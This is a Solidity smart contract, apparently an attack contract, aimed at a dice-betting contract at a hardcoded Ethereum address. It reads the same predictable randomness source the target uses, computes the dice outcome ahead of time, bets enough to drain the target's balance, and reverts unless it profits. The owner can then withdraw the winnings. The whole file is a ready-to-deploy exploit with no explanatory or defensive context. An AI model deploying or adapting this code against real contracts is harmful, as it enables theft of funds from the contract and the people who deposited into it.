 

pragma solidity ^0.5.0;

interface Niguez {
    function ra() external view returns (uint256);
    function rx() external view returns (uint256);
}

interface Target {
    function bet(uint _diceOne, uint _diceTwo) payable external;
}

contract CatchFireE66C {
    
    address owner = msg.sender;    
    
    Niguez internal niguez = Niguez(0x031eaE8a8105217ab64359D4361022d0947f4572);
    Target internal target = Target(0xE66C111d113c960dBaAd9496B887d3d646e80bc4);
    
    uint minBet = 1000000000000000;
  
    function ping() public payable {
        require(msg.sender == owner);
        
        uint256 initialBalance = address(this).balance;
        uint256 targetBalance = address(target).balance;
        
        uint256 rollone = niguez.ra() % 6 + 1;
        uint256 rolltwo = niguez.rx() % 6 + 1;
        uint256 totalroll = rollone + rolltwo;
        
        uint256 betAmount;
        
        if (totalroll == 2 || totalroll == 12) {
            betAmount = targetBalance / 29;
        } else if (rollone == rolltwo) {
            betAmount = targetBalance / 7;
        } else {
            betAmount = targetBalance;
        }

        if (initialBalance >= betAmount && betAmount >= minBet) {
            target.bet.value(betAmount)(rollone, rolltwo);
            require(address(this).balance > initialBalance);
        }
    }
    
    function () external payable {
    }
    
    function withdraw() public {
        if (msg.sender == owner) {
            msg.sender.transfer(address(this).balance);
        }
    }
  
}